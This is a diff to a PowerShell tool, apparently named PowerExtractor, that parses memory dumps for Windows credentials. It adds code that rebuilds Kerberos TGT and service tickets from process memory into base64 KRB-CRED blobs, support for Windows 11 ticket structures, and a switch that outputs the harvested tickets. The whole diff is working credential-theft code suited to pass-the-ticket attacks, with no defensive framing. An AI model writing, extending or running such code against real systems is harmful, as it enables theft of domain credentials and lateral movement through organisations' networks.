+                Add-DERTag -Tag 0xA0 -Data @(
+                    Add-DERSequence -Data @(
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @([Convert]::ToInt64($TicketEncType, 16)))
+                        Add-DERTag -Tag 0xA1 -Data @(
+                            Add-DERTag -Tag 0x04 -Data (Convert-HexToByteArray $Key.Data) # Session key
+                            )
+                        )
+                    )
+                Add-DERTag -Tag 0xa1 -Data((Add-DERUtf8String -Text $AltTargetDomainName.Data))
+
+                Add-DERTag -Tag 0xA2 -Data @(
+                    Add-DERSequence -Data @(
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($Clientname.NameType))
+                        Add-DERTag -Tag 0xA1 -Data @(
+                             Add-DERSequence -Data @(Add-DERUtf8String($Clientname.Names.Data)) # Session key
+                            )
+                        )
+                    )
+                Add-DERTag -Tag 0xA3 -Data @(Add-DERBitString -Data (Convert-HexToByteArray ("00" + $TicketFlags)))
+                #Add-DERTag -Tag 0xA4 -Data @(Add-DERDate -Date $startTime.value)
+                Add-DERTag -Tag 0xA5 -Data @(Add-DERDate -Date ([datetime]::FromFileTime($startTime.value)))
+                Add-DERTag -Tag 0xA6 -Data @(Add-DERDate -Date ([datetime]::FromFileTime($endTime.value))) # Generalized time: EndTime
+                Add-DERTag -Tag 0xA7 -Data @(Add-DERDate -Date ([datetime]::FromFileTime($RenewUntil.value))) # Generalized time: RenewTill
+                Add-DERTag -Tag 0xA8 -Data((Add-DERUtf8String -Text $DomainName.Data))
+                Add-DERTag -Tag 0xA9 -Data @(
+                    Add-DERSequence -Data @(
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($ServiceName.NameType))
+                        Add-DERTag -Tag 0xA1 -Data @(
+                             Add-DERSequence -Data @(
+                              $EncServiceNames
+                             )
+                            )
+                        )
+                    )
+                )
+
+        $ENCKRBCredPart =  Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0))
+                Add-DERTAG -Tag 0xA2 (Add-DEROctetString (Add-DERTag -Tag 0x7D -Data @( (Add-DERSequence -Data @((Add-DERTag -Tag 0xA0 -data (Add-DERSequence -Data @( $TicketInfo)))) ))))
+                )
+
+        # Ticket
+        $krb5_pvno = 5
+        $TRealm =     Add-DERTag -Tag 0xa8 -Data((Add-DERUtf8String -Text $DomainName.Data))
+        $NAME_TYPE_SRV_INST = 02 
+
+        $TSName = Add-DERSequence -Data @(
+                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($NAME_TYPE_SRV_INST))
+                Add-DERTag -Tag 0xA1 -Data @(
+                     Add-DERSequence -Data @(
+                      $EncServiceNames
+                     ) # Session key
+                    )
+                )
+        $ETicket = Add-DERSequence -Data @(
+               Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @([Convert]::ToInt64($TicketEncType, 16)))
+               Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @($TicketKvno))
+               Add-DERTag -Tag 0xA2 -Data @(Add-DEROctetString (Convert-HexToByteArray $Ticket.Data))   
+               )
+
+        # Final Ticket
+        $TicketFull = Add-DERTag -Tag 0x61 -Data @( Add-DERSequence -Data @(
+                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($krb5_pvno))
+                    Add-DERTag -Tag 0xA1 -Data @(Add-DERUtf8String -Text $DomainName.Data)
+                    Add-DERTag -Tag 0xA2 -Data @( $TSName)
+                    Add-DERTag -Tag 0xA3 -Data @($ETicket )
+                    ))
+        $pvno = 05
+        $MSG_KRB_CRED = 22
+       
+        $TheTicket =  Add-DERTag -Tag 0x76 -Data @(
+            Add-DERSequence -Data @(
+            Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @($pvno))
+            Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @($MSG_KRB_CRED))
+            Add-DERTAG -Tag 0xA2 (Add-DERSequence -Data @($TicketFull)) 
+            Add-DERTAG -Tag 0xA3 ($ENCKRBCredPart)   
+        ))
+
+        $TicketB64 = ([System.Convert]::ToBase64String($TheTicket)) 
+
+        $Kerberos_internal_ticket = New-Object -Type psobject -Property (@{
+		    "Flink" = $Flink
+		    "Blink" = $Blink
+		    "unk0" = $unk0
+		    "unk1" = $unk1
+		    "ServiceName" = $ServiceName
+		    "TargetName" = $TargetName
+		    "DomainName" = $DomainName
+		    "TargetDomainName" = $TargetDomainName
+		    "Description" = $Description
+		    "AltTargetDomainName" = $AltTargetDomainName
+            "KDCServer" = $KDCServer
+            "unk10586d" = $unk10586d
+		    "ClientName" = $ClientName
+		    "name0" = $name0
+		    "TicketFlags" = $TicketFlags
+		    "unk2" = $unk2 
+            "unk143930" = $unk143930
+            "unk2x" = $unk2x
+		    "KeyType" = $KeyType
+		    "Key" = $Key
+            "unk143931" = $unk143931
+		    "unk3" = $unk3
+		    "unk4" = $unk4
+		    "unk5" = $unk5
+		    "StartTime" = $StartTime
+		    "EndTime" = $EndTime
+		    "RenewUntil" = $RenewUntil
+		    "unk6" = $unk6
+		    "unk7" = $unk7
+		    "domain" = $domain
+		    "unk8" = $unk8
+		    "strangeNames" = $StrangeNames
+		    "unk9" = $unk9
+		    "TicketEncType" = $TicketEncType
+		    "TicketKvno" = $TicketKvno
+		    "Ticket" = $Ticket
+            "TicketType" = $Type
+            "TicketB64" = $TicketB64 
+            })
+        return $Kerberos_internal_ticket
+        }
+
+
+
+
+
 
     Function Get-Node
         {
@@ -5651,6 +6613,12 @@ $Start = Get-Date
 
             }
        
+        $KerberosTickets = New-Object -Type psobject -Property (@{
+            "Ticket1" = ""
+            "Ticket2" = ""
+            "Ticket3" = ""
+            })
+
         $Ticket1List = @()
         foreach($Ticket1 in $KerberosCreds.Tickets_1)
             {
@@ -5670,7 +6638,11 @@ $Start = Get-Date
                         $NEntry = $Entry.flink
                         }
                     $EntryAddressInitialPosition = Get-MemoryAddress -MemoryAddress $NEntry  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP
-                    if($KerberosTemplate.kerberos_ticket_struct -eq "Get-Kerberos_Internal_Ticket_10_1607")
+                    if($KerberosTemplate.kerberos_ticket_struct -eq "Get-Kerberos_Internal_Ticket_11")
+                        {
+                        $Entry = Get-Kerberos_Internal_Ticket_11 -PathToDMP $PathToDMP -Dump $Dump -StartPosition $NEntry
+                        }
+                    elseif($KerberosTemplate.kerberos_ticket_struct -eq "Get-Kerberos_Internal_Ticket_10_1607")
                         {
                         $Entry = Get-Kerberos_Internal_Ticket_10_1607 -PathToDMP $PathToDMP -Dump $Dump -StartPosition $NEntry
                         }
@@ -5696,7 +6668,9 @@ $Start = Get-Date
                     }
                 }
             }
+        $KerberosTickets.ticket1 = $Ticket1List
 
+        # TODO 
         $Ticket2List = @()
         foreach($Ticket in $KerberosCreds.Tickets_2)
             {
@@ -5716,7 +6690,11 @@ $Start = Get-Date
                         $NEntry = $Entry.flink
                         }
                     $EntryAddressInitialPosition = Get-MemoryAddress -MemoryAddress $NEntry  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP
-                    if($KerberosTemplate.kerberos_ticket_struct -eq "Get-Kerberos_Internal_Ticket_10_1607")
+                    if($KerberosTemplate.kerberos_ticket_struct -eq "Get-Kerberos_Internal_Ticket_11")
+                        {
+                        $Entry = Get-Kerberos_Internal_Ticket_11 -PathToDMP $PathToDMP -Dump $Dump -StartPosition $NEntry
+                        }
+                    elseif($KerberosTemplate.kerberos_ticket_struct -eq "Get-Kerberos_Internal_Ticket_10_1607")
                         {
                         $Entry = Get-Kerberos_Internal_Ticket_10_1607 -PathToDMP $PathToDMP -Dump $Dump -StartPosition $NEntry
                         }
@@ -5743,6 +6721,7 @@ $Start = Get-Date
                     }
                 }
             }
+        $KerberosTickets.ticket2 = $Ticket2List
 
         $Ticket3List = @()
         foreach($Ticket in $KerberosCreds.Tickets_3)
@@ -5763,7 +6742,11 @@ $Start = Get-Date
                         $NEntry = $Entry.flink
                         }
                     $EntryAddressInitialPosition = Get-MemoryAddress -MemoryAddress $NEntry  -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP 
-                    if($KerberosTemplate.kerberos_ticket_struct -eq "Get-Kerberos_Internal_Ticket_10_1607")
+                    if($KerberosTemplate.kerberos_ticket_struct -eq "Get-Kerberos_Internal_Ticket_11")
+                        {
+                        $Entry = Get-Kerberos_Internal_Ticket_11 -PathToDMP $PathToDMP -Dump $Dump -StartPosition $NEntry
+                        }
+                    elseif($KerberosTemplate.kerberos_ticket_struct -eq "Get-Kerberos_Internal_Ticket_10_1607")
                         {
                         $Entry = Get-Kerberos_Internal_Ticket_10_1607 -PathToDMP $PathToDMP -Dump $Dump -StartPosition $NEntry
                         }
@@ -5790,7 +6773,10 @@ $Start = Get-Date
                     }
                 }
             } 
-        return  $KerberosCreds
+
+        $KerberosTickets.ticket3 = $Ticket3List
+        
+        return  $KerberosCreds, $KerberosTickets
         }
 
     Function Get-MSV
@@ -5850,6 +6836,174 @@ $Start = Get-Date
         }
 
 
+#############################################################
+# 
+# The following functions:
+#
+# Get-DERLengthBytes
+# Add-DERTag
+# Add-DERInteger
+# Add-DERSequence
+# Add-DEROctetString
+# Add-DERUtf8String
+# Add-DERDate
+# Add-DERBitString
+# Convert-HexToByteArray
+#
+# Those were copied from the AADInternals (https://github.com/Gerenios/AADInternals) 
+# developed by @DrAzureAD (Nestori Syynimaa) - awesome work!
+#
+#############################################################
+
+    function Get-DERLengthBytes
+    {
+        Param(
+            [Parameter(Mandatory=$True)]
+            [byte[]]$Data
+        )
+        Process
+        {
+            $length = $Data.Length
+            if($length -lt 128)
+            {
+                return $length
+            }
+            elseif($length -lt 256)
+            {
+                # We return 1000 0010 = multibyte (1000), one bytes (0001)
+                return @(0x81, $length)
+            }
+            else
+            {
+                $secondByte = $length % 256
+                $firstByte = ($length - $secondByte)/256
+                # We return 1000 0010 = multibyte (1000), two bytes (0010)
+                return @(0x82, $firstByte, $secondByte)
+            }
+        }
+    }
+
+    function Add-DERTag
+    {
+        Param(
+            [Parameter(Mandatory=$True)]
+            [byte]$Tag,
+            [Parameter(Mandatory=$True)]
+            [byte[]]$Data
+        )
+        Process
+        {
+            $output = @($Tag)
+            $output += Get-DERLengthBytes($Data)
+            $output += $Data
+            return $output
+        }
+    }
+
+    function Add-DERSequence
+    {
+        Param(
+            [Parameter(Mandatory=$True)]
+            [byte[]]$Data
+        )
+        Process
+        {
+            $output = @(0x30)
+            $output += Get-DERLengthBytes($Data)
+            $output += $Data
+            return $output
+        }
+    }
+
+    function Add-DERInteger
+    {
+        Param(
+            [Parameter(Mandatory=$True)]
+            [byte[]]$Data
+        )
+        Process
+        {
+            return Add-DERTag -Tag 0x02 -Data $Data
+        }
+    }
+
+    function Add-DEROctetString
+    {
+        Param(
+            [Parameter(Mandatory=$True)]
+            [byte[]]$Data
+        )
+        Process
+        {
+            return Add-DERTag -Tag 0x04 -Data $Data
+        }
+    }
+
+    function Add-DERUtf8String
+    {
+        Param(
+            [Parameter(Mandatory=$True)]
+            [String]$Text,
+            [byte]$Tag=0x1B
+        )
+        Process
+        {
+            $data = [system.text.encoding]::UTF8.GetBytes($Text)
+            $output = @($Tag)
+            $output += Get-DERLengthBytes($data)
+            $output += $data
+            return $output
+        }
+    }
+
+    function Add-DERDate
+    {
+        Param(
+            [Parameter(Mandatory=$True)]
+            [DateTime]$Date
+        )
+        Process
+        {
+            return Add-DERUtf8String -Text $Date.ToUniversalTime().ToString("yyyyMMddHHmmssZ") -Tag 0x18
+        }
+    }
+
+    function Add-DERBitString
+    {
+        Param(
+            [Parameter(Mandatory=$True)]
+            [byte[]]$Data
+        )
+        Process
+        {
+            return Add-DERTag -Tag 0x03 -Data $Data
+        }
+    }
+
+    Function Convert-HexToByteArray
+    {
+
+        [cmdletbinding()]
+
+        param(
+            [parameter(Mandatory=$true,ValueFromPipeline)]
+            [String]
+            $HexString
+        )
+
+        $Bytes = [byte[]]::new($HexString.Length / 2)
+
+        For($i=0; $i -lt $HexString.Length; $i+=2){
+            $Bytes[$i/2] = [convert]::ToByte($HexString.Substring($i, 2), 16)
+        }
+
+        $Bytes
+    }
+
+#############################################################
+
+
+
     $MINIDUMP_STREAM_TYPE = New-Object -Type psobject -Property (@{
             "UnusedStream"			   	= 0
             "ReservedStream0"			= 1
@@ -5905,7 +7059,7 @@ $Start = Get-Date
     else {
             $DebugPreference = "SilentlyContinue"
     }
-    
+
     if((Test-Path $PathToDMP) -and ($PathToDMP.Length -gt 0))
         {
         Write-Debug -Message ("Inputfile valid and identified in: " + $PathToDMP)
@@ -6092,7 +7246,9 @@ $Start = Get-Date
     Write-Debug -Message ("Parsing of MSV Credentials completed")
     Write-Debug -Message ("Parsing of Kerberos Credentials started")
     #Parse Kerberos
-    $KerberosCredList = Get-Kerberos -pathToDMP $PathToDMP -Dump $Dump
+    $KerberosCredsTickets = Get-Kerberos -pathToDMP $PathToDMP -Dump $Dump
+    $KerberosCredList = $KerberosCredsTickets[0]
+    $KerberosTicketList = $KerberosCredsTickets[1]
     Write-Debug -Message ("Parsing of Kerberos Credentials completed")
 
     Write-Debug -Message ("Credentialparsing completed.")
@@ -6150,8 +7306,45 @@ $Start = Get-Date
                     "Type" = "Kerberos"
                     }) 
             }
-
         }
+    
+    $KerberosTicketOutcome = @()
+    Foreach($Entry in $KerberosTicketList.Ticket1)
+        {
+        $KerberosTicketOutcome += New-Object -Type psobject -Property (@{
+             "Username" = $entry.ClientName.Names.Data
+             "TargetDomain" =  $entry.TargetDomainName.data
+             "Domain" = $entry.DomainName.data
+             "Service" = $Entry.ServiceName.Names.data
+             "Type" = "TGS"
+             "TicketB64" = $Entry.TicketB64
+             })
+        }
+
+    Foreach($Entry in $KerberosTicketList.Ticket2)
+        {
+        $KerberosTicketOutcome += New-Object -Type psobject -Property (@{
+             "Username" = $entry.ClientName.Names.Data
+             "TargetDomain" =  $entry.TargetDomainName.data
+             "Domain" = $entry.DomainName.data
+             "Service" = $Entry.ServiceName.Names.data
+             "Type" = "Client"
+             "TicketB64" = $Entry.TicketB64
+             })        
+        }
+
+    Foreach($Entry in $KerberosTicketList.Ticket3)
+        {
+        $KerberosTicketOutcome += New-Object -Type psobject -Property (@{
+             "Username" = $entry.ClientName.Names.Data
+             "TargetDomain" =  $entry.TargetDomainName.data
+             "Domain" = $entry.DomainName.data
+             "Service" = $Entry.ServiceName.Names.data
+             "Type" = "TGT"
+             "TicketB64" = $Entry.TicketB64
+             })        
+        }
+
 
     Write-Debug -Message ("Results extracted. In summary " + $MSVOutcome.count + " Entries could be identfied")
     Write-Debug -Message ("Results extracted. In summary " + $KerberosOutcome.count + " Entries could be identfied")
@@ -6161,6 +7354,13 @@ $Start = Get-Date
     $Runtime = $End - $start
     Write-Debug -Message ("PowerExtractor completed - Runtime: " + $Runtime.Hours.ToString().PadLeft(2,'0') + ":" + $Runtime.Minutes.ToString().PadLeft(2,'0') + ":" + $Runtime.Seconds.ToString().PadLeft(2,'0') )
 
-    return $MSVOutcome, $KerberosOutcome
+    if($GetMeTickets -eq $true)
+        {
+            return ($KerberosTicketOutcome | fl), $MSVOutcome, $KerberosOutcome
+        }
+    else
+        {
+            return $MSVOutcome, $KerberosOutcome
+        }
 
 }
